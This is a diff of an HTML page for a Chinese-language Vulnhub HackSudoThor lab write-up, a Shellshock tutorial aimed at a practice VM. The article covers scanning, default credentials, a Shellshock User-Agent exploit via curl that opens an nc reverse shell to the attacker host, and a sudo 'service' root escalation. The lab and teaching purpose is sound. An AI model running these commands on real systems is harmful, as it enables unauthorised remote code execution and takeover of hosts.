@@ -123,30 +123,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&text=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&is_video=false&description=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=10 Vulnhub HackSudoThor Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&title=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&name=10 Vulnhub HackSudoThor Writeup&description=&lt;p&gt;该靶机难度为中等，主要是&lt;strong&gt;破壳漏洞&lt;/strong&gt;为第一次遇到，有点没底。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/&t=10 Vulnhub HackSudoThor Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#common-gateway-interface-%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">Common Gateway Interface 基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">破壳漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF"><span class="toc-number">3.2.</span> <span class="toc-text">前置技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.1.</span> <span class="toc-text">bash基础</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">3.3.</span> <span class="toc-text">影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-number">3.5.</span> <span class="toc-text">利用分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.6.</span> <span class="toc-text">利用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Eget-shell"><span class="toc-number">4.3.</span> <span class="toc-text">破壳漏洞get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
@@ -173,8 +155,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-11T16:00:00.000Z" itemprop="datePublished">2022-04-12</time>
-        
-        (Updated: <time datetime="2022-04-27T03:42:18.731Z" itemprop="dateModified">2022-04-27</time>)
         
       
     </div>
@@ -260,14 +240,14 @@
 <p><strong>漏洞原理</strong>：</p>
 <p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
 <p><strong>接下来才是漏洞产生的重点：</strong></p>
-<p>如果我们导入如下的字符串为全局变量： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">func</span><span class="token operator">=</span><span class="token string">'() &#123; echo "hello world!"; &#125;; cat /etc/passwd;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
 <p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
 <p>并且此时<code>func</code>也会被当作函数执行。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
 <p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
 <p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
-<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <pre class="line-numbers language-none"><code class="language-none">() &#123; :; &#125;; echo; command;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
 </blockquote>
@@ -279,9 +259,7 @@
 <h1 id="渗透">渗透</h1>
 <p>kali：10.0.2.4</p>
 <h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.13
-<span class="token function">sudo</span> nmap -p21,22,80 -sV <span class="token number">10.0</span>.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
 <ul>
 <li>21端口的服务为ftp</li>
@@ -291,36 +269,30 @@
 </ul>
 <h2 id="访问http服务">访问http服务</h2>
 <p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
-<p>接着进行路径发现。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
 <p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
-<p>访问网站，找到了下面这句话： <pre class="line-numbers language-none"><code class="language-none">However some important usernames and passwords are provided below :
-Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.
-Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
 <p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
 <p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
 <p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
 <h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
 <p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
 <p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p80 --script http-shellshock --script-args <span class="token assign-left variable">uri</span><span class="token operator">=</span>/cgi-bin/shell.sh,cmd<span class="token operator">=</span>ls <span class="token number">10.0</span>.2.13
-<span class="token comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span>
-<span class="token comment"># 如果最后的命令执行成功，说明存在漏洞</span>
-<span class="token comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
 <p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -H <span class="token string">"user-agent:() &#123; :; &#125;; echo; /bin/bash -c 'which nc'"</span> <span class="token punctuation">\</span>http://10.0.2.13/cgi-bin/shell.sh
-<span class="token comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
-<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -H <span class="token string">"user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c 'nc -e /bin/bash 10.0.2.4 4444'"</span> <span class="token punctuation">\</span>http://10.0.2.13/cgi-bin/shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
 <p>反弹成功！</p>
 <h2 id="权限提升">权限提升</h2>
 <p>首先查看一下sudo配置<code>sudo -l</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
-<p>发现了奇怪的东西，我们尝试执行一下 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -u thor /home/thor/./hammer.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
 <p>然后要求我们输入，我们输入几条系统命令看一下</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
 <p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
@@ -333,7 +305,7 @@ Username of most of the customers is their &quot;first_name&quot; &amp; password
 <p>网站中提到</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
-<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /usr/sbin/service <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
 <p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
@@ -399,7 +371,6 @@ Username of most of the customers is their &quot;first_name&quot; &amp; password
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
